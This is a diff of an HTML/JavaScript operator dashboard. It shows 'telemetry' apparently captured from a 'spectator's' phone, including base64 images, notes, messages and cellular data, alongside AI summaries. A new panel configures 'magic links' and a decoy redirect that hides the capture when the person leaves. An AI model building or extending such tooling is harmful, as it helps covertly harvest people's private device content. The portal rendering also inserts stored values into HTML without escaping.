@@ -3,42 +3,83 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Data Center & History</title>
+  <title>Control Panel</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-[#090a0f] text-slate-200 min-h-screen font-sans selection:bg-slate-700 selection:text-white">
   
-  <div class="max-w-4xl mx-auto px-6 py-12">
+  <div class="max-w-4xl mx-auto px-6 py-8">
     
-    <!-- Header & Tab Navigation -->
-    <header class="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-6 border-b border-white/10 mb-8">
-      <div>
-        <h1 class="text-xl font-semibold tracking-tight text-white">Data Center & Logs</h1>
-        <p class="text-xs text-slate-400 mt-1">Manage device telemetry packets and AI-generated summaries.</p>
-      </div>
-      <div class="flex items-center gap-2 bg-black/40 border border-white/10 p-1 rounded-xl">
-        <button id="tab-telemetry-btn" onclick="switchTab('telemetry')" class="text-xs px-3 py-1.5 rounded-lg font-medium transition bg-white/10 text-white">Telemetry</button>
-        <button id="tab-summaries-btn" onclick="switchTab('summaries')" class="text-xs px-3 py-1.5 rounded-lg font-medium transition text-slate-400 hover:text-white">AI Summaries</button>
-      </div>
-    </header>
+    <!-- Main Top Navigation -->
+    <nav class="flex items-center gap-2 mb-10 border-b border-white/10 pb-4">
+      <button id="nav-data-btn" onclick="switchMainView('data')" class="px-4 py-2 text-sm font-semibold rounded-lg transition bg-white/10 text-white">Data Center</button>
+      <button id="nav-portal-btn" onclick="switchMainView('portal')" class="px-4 py-2 text-sm font-semibold rounded-lg transition text-slate-400 hover:text-white hover:bg-white/5">Portal Controller</button>
+    </nav>
 
-    <!-- Toolbar / Search / Refresh -->
-    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-6">
-      <input type="text" id="search-input" oninput="renderCurrentTab()" placeholder="Filter entries..." class="w-full bg-black/40 border border-white/10 rounded-lg px-4 py-2.5 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-white/30 transition">
-      <div class="flex items-center gap-3 shrink-0">
-        <select id="sort-select" onchange="renderCurrentTab()" class="bg-black/40 border border-white/10 rounded-lg px-3 py-2 text-xs text-slate-300 focus:outline-none focus:border-white/30 transition">
-          <option value="newest">Newest First</option>
-          <option value="oldest">Oldest First</option>
-        </select>
-        <button onclick="loadAllData()" class="bg-white/5 hover:bg-white/10 border border-white/10 text-slate-300 text-xs px-3.5 py-2 rounded-lg transition active:scale-95">
-          Refresh
-        </button>
+    <!-- ========================================== -->
+    <!-- VIEW 1: DATA CENTER (Telemetry & Summaries) -->
+    <!-- ========================================== -->
+    <div id="view-data" class="block">
+      <header class="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-6">
+        <div>
+          <h1 class="text-xl font-semibold tracking-tight text-white">Data Center & Logs</h1>
+          <p class="text-xs text-slate-400 mt-1">Manage device telemetry packets and AI-generated summaries.</p>
+        </div>
+        <div class="flex items-center gap-2 bg-black/40 border border-white/10 p-1 rounded-xl">
+          <button id="tab-telemetry-btn" onclick="switchDataTab('telemetry')" class="text-xs px-3 py-1.5 rounded-lg font-medium transition bg-white/10 text-white">Telemetry</button>
+          <button id="tab-summaries-btn" onclick="switchDataTab('summaries')" class="text-xs px-3 py-1.5 rounded-lg font-medium transition text-slate-400 hover:text-white">AI Summaries</button>
+        </div>
+      </header>
+
+      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-6">
+        <input type="text" id="search-input" oninput="renderCurrentDataTab()" placeholder="Filter entries..." class="w-full bg-black/40 border border-white/10 rounded-lg px-4 py-2.5 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-white/30 transition">
+        <div class="flex items-center gap-3 shrink-0">
+          <select id="sort-select" onchange="renderCurrentDataTab()" class="bg-black/40 border border-white/10 rounded-lg px-3 py-2 text-xs text-slate-300 focus:outline-none focus:border-white/30 transition">
+            <option value="newest">Newest First</option>
+            <option value="oldest">Oldest First</option>
+          </select>
+          <button onclick="loadAllData()" class="bg-white/5 hover:bg-white/10 border border-white/10 text-slate-300 text-xs px-3.5 py-2 rounded-lg transition active:scale-95">Refresh</button>
+        </div>
+      </div>
+
+      <div id="content-container" class="space-y-3">
+        <div class="text-center py-20 text-xs text-slate-500">Loading data...</div>
       </div>
     </div>
 
-    <!-- Main Content Container -->
-    <div id="content-container" class="space-y-3">
-      <div class="text-center py-20 text-xs text-slate-500">Loading data...</div>
+    <!-- ========================================== -->
+    <!-- VIEW 2: PORTAL CONTROLLER                  -->
+    <!-- ========================================== -->
+    <div id="view-portal" class="hidden">
+      <header class="mb-8">
+        <h1 class="text-xl font-semibold tracking-tight text-white">Portal Controller</h1>
+        <p class="text-xs text-slate-400 mt-1">Configure your active magic links and decoy redirect.</p>
+      </header>
+
+      <div class="space-y-6 max-w-lg">
+        <!-- Master Redirect -->
+        <div>
+          <label class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2 block">Master Decoy Redirect</label>
+          <div class="bg-black/30 border border-white/10 rounded-xl p-4">
+            <label class="text-[11px] text-slate-500 block mb-1">URL when spectator clicks off or taps back</label>
+            <input type="text" id="masterRedirect" class="w-full bg-black/50 border border-white/10 rounded-lg px-3 py-2.5 text-sm text-slate-200 focus:outline-none focus:border-indigo-500/50 transition">
+          </div>
+        </div>
+
+        <!-- Portal Buttons -->
+        <div>
+          <label class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2 block">Portal Buttons</label>
+          <div id="portal-links-list" class="space-y-3"></div>
+          
+          <button onclick="addPortalLink()" class="w-full mt-3 bg-black/30 hover:bg-black/50 border border-dashed border-white/20 text-indigo-400 hover:text-indigo-300 text-sm font-semibold rounded-xl py-3.5 transition">
+            + Add Button
+          </button>
+        </div>
+
+        <button onclick="savePortalData()" class="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold rounded-xl py-4 shadow-lg shadow-indigo-900/20 transition active:scale-[0.98]">
+          Save All Changes
+        </button>
+      </div>
     </div>
 
   </div>
@@ -46,7 +87,6 @@
   <!-- Telemetry Inspector Modal -->
   <div id="inspector-modal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
     <div class="bg-[#12131c] border border-white/10 rounded-2xl w-full max-w-3xl max-h-[90vh] flex flex-col shadow-2xl overflow-hidden">
-      
       <div class="flex items-center justify-between px-6 py-4 border-b border-white/10 bg-black/20">
         <h2 class="text-sm font-medium text-white flex items-center gap-2">
           <span>Session Inspector</span>
@@ -54,7 +94,6 @@
         </h2>
         <button onclick="closeModal()" class="text-slate-400 hover:text-white text-xs px-2.5 py-1 rounded-lg bg-white/5 hover:bg-white/10 transition">Close</button>
       </div>
-
       <div class="p-6 overflow-y-auto space-y-6 text-xs font-mono">
         <div>
           <p class="text-slate-400 font-sans font-medium mb-3 uppercase tracking-wider text-[10px]">Captured Assets (Base64)</p>
@@ -69,10 +108,8 @@
             </div>
           </div>
         </div>
-
         <div class="space-y-4 font-sans">
           <p class="text-slate-400 font-medium uppercase tracking-wider text-[10px]">Text & Data Payloads</p>
-          
           <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
             <div class="bg-black/40 border border-white/10 rounded-xl p-4">
               <div class="flex justify-between items-center mb-2">
@@ -89,7 +126,6 @@
               <div id="field-cellular" class="text-slate-200 text-xs font-mono whitespace-pre-wrap bg-black/50 p-3 rounded border border-white/5 max-h-32 overflow-y-auto"></div>
             </div>
           </div>
-
           <div class="bg-black/40 border border-white/10 rounded-xl p-4">
             <div class="flex justify-between items-center mb-2">
               <span class="text-[11px] font-medium text-slate-400">Notes Field</span>
@@ -97,7 +133,6 @@
             </div>
             <div id="field-notes" class="text-slate-200 text-xs font-mono whitespace-pre-wrap bg-black/50 p-3 rounded border border-white/5 max-h-32 overflow-y-auto"></div>
           </div>
-
           <div class="bg-black/40 border border-white/10 rounded-xl p-4">
             <div class="flex justify-between items-center mb-2">
               <span class="text-[11px] font-medium text-slate-400">Messages Payload</span>
@@ -105,7 +140,6 @@
             </div>
             <div id="field-messages" class="text-slate-200 text-xs font-mono whitespace-pre-wrap bg-black/50 p-3 rounded border border-white/5 max-h-32 overflow-y-auto"></div>
           </div>
-
           <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
             <div class="bg-black/40 border border-white/10 rounded-xl p-4">
               <span class="text-[11px] font-medium text-slate-400 block mb-1">Hotspot</span>
@@ -126,10 +160,52 @@
   </div>
 
   <script>
-    let activeTab = 'telemetry';
+    // --- GLOBAL STATE ---
+    let activeMainView = 'data'; // 'data' | 'portal'
+    let activeDataTab = 'telemetry';
+    
     let telemetryData = [];
     let summariesData = [];
+    let portalLinks = [];
 
+    // --- NAVIGATION LOGIC ---
+    function switchMainView(view) {
+      activeMainView = view;
+      const dataBtn = document.getElementById('nav-data-btn');
+      const portalBtn = document.getElementById('nav-portal-btn');
+      const dataView = document.getElementById('view-data');
+      const portalView = document.getElementById('view-portal');
+
+      if (view === 'data') {
+        dataBtn.className = "px-4 py-2 text-sm font-semibold rounded-lg transition bg-white/10 text-white";
+        portalBtn.className = "px-4 py-2 text-sm font-semibold rounded-lg transition text-slate-400 hover:text-white hover:bg-white/5";
+        dataView.classList.remove('hidden');
+        portalView.classList.add('hidden');
+      } else {
+        portalBtn.className = "px-4 py-2 text-sm font-semibold rounded-lg transition bg-white/10 text-white";
+        dataBtn.className = "px-4 py-2 text-sm font-semibold rounded-lg transition text-slate-400 hover:text-white hover:bg-white/5";
+        portalView.classList.remove('hidden');
+        dataView.classList.add('hidden');
+        loadPortalData(); // Lazy load portal data when tab is opened
+      }
+    }
+
+    function switchDataTab(tab) {
+      activeDataTab = tab;
+      const telBtn = document.getElementById('tab-telemetry-btn');
+      const sumBtn = document.getElementById('tab-summaries-btn');
+      
+      if (tab === 'telemetry') {
+        telBtn.className = "text-xs px-3 py-1.5 rounded-lg font-medium transition bg-white/10 text-white";
+        sumBtn.className = "text-xs px-3 py-1.5 rounded-lg font-medium transition text-slate-400 hover:text-white";
+      } else {
+        sumBtn.className = "text-xs px-3 py-1.5 rounded-lg font-medium transition bg-white/10 text-white";
+        telBtn.className = "text-xs px-3 py-1.5 rounded-lg font-medium transition text-slate-400 hover:text-white";
+      }
+      renderCurrentDataTab();
+    }
+
+    // --- DATA CENTER LOGIC ---
     async function loadAllData() {
       try {
         const [subRes, sumRes] = await Promise.all([
@@ -141,33 +217,15 @@
 
         telemetryData = subJson.success ? subJson.submissions : [];
         summariesData = sumJson.success ? sumJson.summaries : [];
-        renderCurrentTab();
+        renderCurrentDataTab();
       } catch (err) {
         document.getElementById('content-container').innerHTML = `<div class="text-center py-20 text-xs text-red-400">Failed to load data.</div>`;
       }
     }
 
-    function switchTab(tab) {
-      activeTab = tab;
-      const telBtn = document.getElementById('tab-telemetry-btn');
-      const sumBtn = document.getElementById('tab-summaries-btn');
-      
-      if (tab === 'telemetry') {
-        telBtn.className = "text-xs px-3 py-1.5 rounded-lg font-medium transition bg-white/10 text-white";
-        sumBtn.className = "text-xs px-3 py-1.5 rounded-lg font-medium transition text-slate-400 hover:text-white";
-      } else {
-        sumBtn.className = "text-xs px-3 py-1.5 rounded-lg font-medium transition bg-white/10 text-white";
-        telBtn.className = "text-xs px-3 py-1.5 rounded-lg font-medium transition text-slate-400 hover:text-white";
-      }
-      renderCurrentTab();
-    }
-
-    function renderCurrentTab() {
-      if (activeTab === 'telemetry') {
-        renderTelemetry();
-      } else {
-        renderSummaries();
-      }
+    function renderCurrentDataTab() {
+      if (activeDataTab === 'telemetry') renderTelemetry();
+      else renderSummaries();
     }
 
     function renderTelemetry() {
@@ -180,7 +238,6 @@
         const msgStr = String(item.messages || '').toLowerCase();
         return notesStr.includes(query) || msgStr.includes(query);
       });
-
       filtered.sort((a, b) => sortMode === 'newest' ? b.timestamp - a.timestamp : a.timestamp - b.timestamp);
 
       if (filtered.length === 0) {
@@ -204,10 +261,7 @@
       const query = document.getElementById('search-input').value.toLowerCase();
       const sortMode = document.getElementById('sort-select').value;
 
-      let filtered = summariesData.filter(item => {
-        return item.title.toLowerCase().includes(query) || item.text.toLowerCase().includes(query);
-      });
-
+      let filtered = summariesData.filter(item => item.title.toLowerCase().includes(query) || item.text.toLowerCase().includes(query));
       filtered.sort((a, b) => sortMode === 'newest' ? b.timestamp - a.timestamp : a.timestamp - b.timestamp);
 
       if (filtered.length === 0) {
@@ -215,7 +269,6 @@
         return;
       }
 
-      // Build quick lookup map for telemetry items
       const subMap = {};
       telemetryData.forEach(s => { subMap[s.id] = s; });
 
@@ -239,13 +292,96 @@
       }).join('');
     }
 
+    // --- PORTAL CONTROLLER LOGIC ---
+    async function loadPortalData() {
+      try {
+        const res = await fetch('/api/portal?t=' + Date.now());
+        const data = await res.json();
+        document.getElementById('masterRedirect').value = data.masterRedirect || '';
+        portalLinks = data.links || [];
+        renderPortal();
+      } catch (err) {
+        console.error('Failed to load portal data:', err);
+      }
+    }
+
+    function renderPortal() {
+      const container = document.getElementById('portal-links-list');
+      container.innerHTML = '';
+      portalLinks.forEach((item, index) => {
+        const div = document.createElement('div');
+        div.className = 'bg-black/30 border border-white/10 rounded-xl p-4 portal-card';
+        div.innerHTML = `
+          <div class="flex items-center justify-between mb-3">
+            <div class="text-[10px] font-bold text-slate-500 uppercase tracking-wide">Button #${index + 1}</div>
+            <button onclick="removePortalLink(${index})" class="text-[10px] font-semibold text-red-400 hover:text-red-300 bg-red-500/10 hover:bg-red-500/20 px-2 py-1 rounded transition">Delete</button>
+          </div>
+          <div class="space-y-3">
+            <div>
+              <label class="text-[11px] text-slate-500 block mb-1">Title</label>
+              <input type="text" class="link-title w-full bg-black/50 border border-white/10 rounded-lg px-3 py-2 text-sm text-slate-200 focus:outline-none focus:border-indigo-500/50 transition" value="${item.title}" />
+            </div>
+            <div>
+              <label class="text-[11px] text-slate-500 block mb-1">Target URL</label>
+              <input type="text" class="link-url w-full bg-black/50 border border-white/10 rounded-lg px-3 py-2 text-sm text-slate-200 focus:outline-none focus:border-indigo-500/50 transition" value="${item.url}" />
+            </div>
+          </div>
+        `;
+        container.appendChild(div);
+      });
+    }
+
+    function syncPortalInputs() {
+      const cards = document.querySelectorAll('.portal-card');
+      cards.forEach((card, i) => {
+        if (portalLinks[i]) {
+          portalLinks[i].title = card.querySelector('.link-title').value;
+          portalLinks[i].url = card.querySelector('.link-url').value;
+        }
+      });
+    }
+
+    function addPortalLink() {
+      syncPortalInputs();
+      portalLinks.push({ id: String(Date.now()).slice(-4), title: 'New Link', url: 'https://' });
+      renderPortal();
+    }
+
+    function removePortalLink(index) {
+      syncPortalInputs();
+      portalLinks.splice(index, 1);
+      renderPortal();
+    }
+
+    async function savePortalData() {
+      syncPortalInputs();
+      const payload = {
+        masterRedirect: document.getElementById('masterRedirect').value.trim(),
+        links: portalLinks
+      };
+
+      try {
+        const res = await fetch('/api/save', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        const result = await res.json();
+        if (result.success) {
+          alert('Portal changes saved successfully!');
+        } else {
+          alert('Error saving: ' + JSON.stringify(result));
+        }
+      } catch (err) {
+        alert('Failed to connect to server: ' + err.message);
+      }
+    }
+
+    // --- MODAL & UTILS ---
     function openTelemetryById(subId) {
       const match = telemetryData.find(s => String(s.id) === String(subId));
-      if (match) {
-        openModal(match);
-      } else {
-        alert('Linked telemetry packet not found.');
-      }
+      if (match) openModal(match);
+      else alert('Linked telemetry packet not found.');
     }
 
     function openModal(item) {
@@ -268,8 +404,7 @@
     }
 
     function copyField(elementId) {
-      const text = document.getElementById(elementId).innerText;
-      navigator.clipboard.writeText(text);
+      navigator.clipboard.writeText(document.getElementById(elementId).innerText);
       alert('Copied to clipboard');
     }
 
@@ -284,6 +419,7 @@
       return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
     }
 
+    // Init
     loadAllData();
   </script>
 </body>
